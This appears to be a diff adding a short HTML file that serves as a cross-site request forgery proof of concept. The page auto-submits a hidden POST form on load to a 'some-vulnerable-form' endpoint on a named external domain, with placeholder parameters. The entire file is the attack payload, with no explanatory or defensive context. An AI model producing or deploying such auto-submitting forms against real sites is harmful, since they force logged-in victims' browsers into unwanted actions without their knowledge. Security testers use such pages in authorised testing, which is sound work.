@@ -1,0 +1,9 @@
+<html>
+<body onload='document.CSRF.submit()'>
+  <form id="CSRF" method="POST" action="https://elparts.mekweb.eu/some-vulnerable-form">
+    <input type="hidden" name="param1" value="value1">
+    <input type="hidden" name="param2" value="value2">
+    <input type="submit" value="Submit">
+  </form>
+</body>
+</html>
